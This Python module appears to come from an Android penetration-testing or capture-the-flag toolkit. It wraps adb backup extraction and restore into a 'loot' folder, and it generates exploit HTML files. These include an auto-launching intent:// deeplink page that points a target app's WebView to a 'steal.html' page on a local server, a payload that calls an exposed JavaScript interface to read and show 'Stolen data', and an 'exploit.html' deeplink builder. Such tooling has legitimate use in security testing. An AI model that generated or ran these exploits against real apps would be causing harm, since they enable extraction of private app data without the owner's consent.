import subprocess
from subprocess import DEVNULL, PIPE
from time import sleep
import time
from colorama import Fore
import os
from .constants import Constants

class OtherTools:
    id: str
    _config: dict

    @property
    def config(self):
        return self._config

    @config.setter
    def config(self, data):
        self._config = data

    def __init__(self, low_power_mode=False) -> None:
        self.low_power_mode = low_power_mode
        self._config = {
            "app": "",
            "path": Constants.DIR_LOOT_DATA.value,
            "password": ""

        }
        self._generate_deeplink_data = {
            "server": "http://127.0.0.1:8000/",
            "filename": "steal.html",
            "scheme": "deeplink",
            "package": "com.example.com",
            "component": "com.example.com/.WebViewActivity",
            "deeplink_uri": "host.com",
            "param": "url",
            "js_interface": "readFlag",
            "path": Constants.DIR_LOOT_PATH.value,
            "poc_filename": "launch.html"
        }
        self._generate_deeplink_data_d = {
            "scheme": "deeplink",
            "package": "com.example.com",
            "component": "com.example.com/.WebViewActivity",
            "deeplink_uri": "host.com",
            "extras": [],
            "path": Constants.DIR_LOOT_PATH.value
        }
        self.backup_files = {}
        self._init_backup_constants()
        self._init_tools()
    
    def _init_backup_constants(self):
        self._abe = f'java -jar {os.path.join(Constants.DIR_UTILS_PATH.value, "abe.jar")}'
        self.backup_files["restore_tar"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.NEWBACKUP_NAME_TAR.value)
        self.backup_files["new_backup_ab"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.NEWBACKUP_NAME.value)
        self.backup_files["backup_ab_location"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.BACKUP_NAME.value)
        self.backup_files["package_list"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.PCKLIST_NAME.value)
        self.backup_files["backup_tar_location"] = os.path.join(os.path.join(self.config["path"],self.config["app"]), Constants.BACKUP_COMPRESSED_NAME.value)
        os.makedirs(os.path.dirname(self.backup_files["restore_tar"]), exist_ok=True)

    def _init_tools(self):
        p = subprocess.run(self._abe.split(), stdout=PIPE, stderr=PIPE)
        if not p.stdout or p.stderr:
            print(Fore.RED + '[-] AndroidBackupExtractor is missing. Install the abe.jar file... Exitting... ')
            quit()
        else:
            print(Fore.BLUE + '[*] ABE is running!' + Fore.RESET)

    # Get package list
    def get_package_list(self):
        cmd_get_package_list = f'tar tf {self.backup_files["backup_tar_location"]}'
        p = subprocess.run(cmd_get_package_list.split(), stderr=PIPE, stdout=PIPE)
        out = p.stdout.decode().splitlines()
        with open(self.backup_files["package_list"], 'w') as f:
            f.writelines(out)

    def extract_backup(self):
        self._init_backup_constants()
        cmd = f'{Constants.ADB.value} backup -f {self.backup_files["backup_ab_location"]} {self.config["app"]}'
        p = subprocess.run(cmd.split(), stderr=PIPE, stdout=PIPE)
        time.sleep(5)
        cmd_unpack = f'{self._abe} unpack {self.backup_files["backup_ab_location"]} {self.backup_files["backup_tar_location"]} {self.config["password"]}'
        p = subprocess.run(cmd_unpack.split(), stderr=PIPE, stdout=PIPE)
        cmd_untar = f'tar -C {self.config["path"]} -xf {self.backup_files["backup_tar_location"]}'
        p = subprocess.run(cmd_untar.split(), stderr=PIPE, stdout=PIPE)
        self.get_package_list()

    def restore_backup(self):
        if not os.path.isfile(self.backup_files["package_list"]):
            self.get_package_list()
        cmd_tar = f'tar cf {self.backup_files["restore_tar"]} -T {self.backup_files["package_list"]}'
        p = subprocess.run(cmd_tar.split(), stderr=PIPE, stdout=PIPE)
        # check for errors
        cmd_pack = f'{self._abe} pack {self.backup_files["restore_tar"]} {self.backup_files["new_backup_ab"]} {self.config["password"]}'
        p = subprocess.run(cmd_pack.split(), stderr=PIPE, stdin=PIPE)
        # check for errors
        cmd = f'adb restore {self.backup_files["new_backup_ab"]}'
        p = subprocess.run(cmd.split(), stderr=PIPE, stdin=PIPE)
        # check for errors
        
    def generate_jsinterface(self):
        self._html_poc = {
            "chrome": f"""
        <html>
            <title> Automatic launch of deeplink </title>
            <body>
                <script>
                    window.location.href="intent://{self._generate_deeplink_data['deeplink_uri']}?{self._generate_deeplink_data['param']}={self._generate_deeplink_data['server']}{self._generate_deeplink_data['filename']}#Intent;scheme={self._generate_deeplink_data['scheme']};package={self._generate_deeplink_data['package']};component={self._generate_deeplink_data['component']};end";
                </script>    
            </body>
            </html>
        """,
            "payload": f"""
            <!DOCTYPE html>
                <html>
                <head><title>Read sensitive data</title>
                    <script type="text/javascript">
                        var data;
                        if(window.Android){{
                            data = window.Android.{self._generate_deeplink_data['js_interface']}();
                        }}
                        if(data) {{
                            alert("Stolen data: " + data);
                            document.write("Stolen data: " + data);
                        }}
                    </script>
                </head>
                <body style="text-align: center;">
                    <h1>Stealing Sensitive Data</h1>    
                </body>
                </html>

            """
        }
        # 1. generate the first file
        with open(os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["filename"]), "w") as f:
            f.writelines(self._html_poc["payload"])
            print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["filename"])}' + Fore.RESET)
        # 2. generate the last file
        with open(os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["poc_filename"]), "w") as f:
            f.writelines(self._html_poc["chrome"])
            print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], self._generate_deeplink_data["poc_filename"])}' + Fore.RESET)
    
    def generate_deeplink(self):
        extra_strings = ""
        for extra in self._generate_deeplink_data_d["extras"]:
            extra_strings += f';{extra["type"]}.{extra["key"]}={extra["value"]}'
        poc = f"""
        <!DOCTYPE html>
        <html>
            <body>
                <a id="exploit" href="intent://{self._generate_deeplink_data_d['deeplink_uri']}#Intent;scheme={self._generate_deeplink_data_d['scheme']};package={self._generate_deeplink_data_d['package']};component={self._generate_deeplink_data_d['component']};action=android.intent.action.VIEW{extra_strings};end">Exploit</a>;
            </body>
        </html>
        """
        
        with open(os.path.join(self._generate_deeplink_data_d["path"], "exploit.html"), "w") as f:
            f.writelines(poc)
            print(Fore.GREEN + f'[+] Content written to file {os.path.join(self._generate_deeplink_data["path"], "exploit.html")}' + Fore.RESET)
    